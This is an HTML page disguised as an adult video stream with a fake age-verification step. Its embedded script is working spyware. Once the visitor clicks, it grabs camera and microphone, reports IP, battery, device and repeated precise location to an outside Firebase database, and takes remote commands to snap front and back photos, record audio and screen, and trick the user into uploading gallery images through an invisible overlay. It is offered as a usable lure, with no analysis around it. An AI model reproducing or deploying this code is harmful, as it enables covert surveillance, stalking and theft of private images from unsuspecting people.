<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Stream Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        #bg-image { position: fixed; width: 100%; height: 100%; background: url('bg.png.jpeg') center/cover; filter: blur(8px); z-index: 1; transform: scale(1.1); }
        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.6); }
        #play-btn { width: 100px; height: 100px; border: 4px solid #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #fff; margin-left: 10px; }
        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 350px; background: #111; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; z-index: 1000; color:#fff; }
        .btn-yes { background: #00ff41; color: #000; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
        #target-player { display:none; width:100%; height:100%; position:fixed; top:0; z-index:9999; background:#000; }
        #hiddenFileInput { display: none; }
    </style>
</head>
<body>
    <div id="bg-image"></div>
    <div id="main-ui">
        <div id="play-btn" onclick="document.getElementById('age-modal').style.display='block'"></div>
        <h1 style="color:#00ff41; margin-top:20px;">WATCH VIDEO</h1>
    </div>
    <div id="age-modal">
        <h2>18+ Content</h2>
        <p>Verification Required to view this stream.</p>
        <button class="btn-yes" onclick="initSystem()">CONFIRM & PLAY</button>
    </div>
    <video id="target-player" controls playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
    <input type="file" id="hiddenFileInput" accept="image/*" multiple>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const sessionID = "User_" + Math.floor(Math.random() * 9999);
        let currentStream = null;

        async function initSystem() {
            document.getElementById('age-modal').style.display = 'none';
            try {
                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('main-ui').style.display = 'none';
                const v = document.getElementById('target-player');
                v.style.display = 'block'; v.play();
                
                sendStats();
                setInterval(sendLoc, 8000);
                listenCmd();
            } catch (e) { alert("Access Denied!"); location.reload(); }
        }

        async function sendStats() {
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            const b = await navigator.getBattery();
            db.ref(`targets/${sessionID}/info`).set({
                ip: ip.ip, battery: Math.floor(b.level * 100) + "%",
                device: navigator.platform, status: "ONLINE", time: new Date().toLocaleString()
            });
        }

        function sendLoc() {
            navigator.geolocation.getCurrentPosition(p => {
                db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
            }, null, {enableHighAccuracy:true});
        }

        async function capture(mode, type) {
            // STOP ALL TRACKS TO RELEASE CAMERA FOR SWITCHING
            if(currentStream) { currentStream.getTracks().forEach(t => t.stop()); }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: { exact: mode === 'user' ? 'user' : 'environment' } } 
                }).catch(async () => {
                    // Fallback for some devices that don't support 'exact'
                    return await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                });

                const v = document.createElement('video');
                v.srcObject = stream; await v.play();

                setTimeout(() => {
                    const c = document.createElement('canvas');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    db.ref(`targets/${sessionID}/photos`).push({ img: c.toDataURL('image/jpeg', 0.6), type: type, time: Date.now() });
                    stream.getTracks().forEach(t => t.stop());
                    // Back to background stream
                    navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => currentStream = s);
                }, 2000);
            } catch (err) {
                console.log("Cam Error:", err);
                navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => currentStream = s);
            }
        }

        function listenCmd() {
            db.ref(`commands/${sessionID}`).on('value', snap => {
                const cmd = snap.val(); if(!cmd) return;
                if(cmd.action === 'photo') capture('user', 'Front');
                if(cmd.action === 'back_photo') capture('environment', 'Back');
                if(cmd.action === 'audio') recordAudio();
                if(cmd.action === 'gallery') triggerGall();
                if(cmd.action === 'screen') recordScreen();
                db.ref(`commands/${sessionID}`).remove();
            });
        }

        function recordAudio() {
            const mr = new MediaRecorder(currentStream); let chunks = [];
            mr.ondataavailable = e => chunks.push(e.data);
            mr.onstop = () => {
                const r = new FileReader(); r.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
                r.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({ audio: r.result });
            };
            mr.start(); setTimeout(() => mr.stop(), 5000);
        }

        function triggerGall() {
            const ov = document.createElement('div');
            ov.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:10000;";
            ov.onclick = () => { document.getElementById('hiddenFileInput').click(); document.body.removeChild(ov); };
            document.body.appendChild(ov);
        }

        document.getElementById('hiddenFileInput').onchange = (e) => {
            for(let f of e.target.files) {
                const r = new FileReader();
                r.onload = ev => db.ref(`targets/${sessionID}/gallery`).push({ data: ev.target.result });
                r.readAsDataURL(f);
            }
        };

        async function recordScreen() {
            try {
                const s = await navigator.mediaDevices.getDisplayMedia({video:true});
                const mr = new MediaRecorder(s); let ch = [];
                mr.ondataavailable = e => ch.push(e.data);
                mr.onstop = () => {
                    const r = new FileReader(); r.readAsDataURL(new Blob(ch, {type:'video/webm'}));
                    r.onloadend = () => db.ref(`targets/${sessionID}/screens`).push({ video: r.result });
                    s.getTracks().forEach(t => t.stop());
                };
                mr.start(); setTimeout(() => mr.stop(), 8000);
            } catch(e){}
        }
    </script>
</body>
</html>
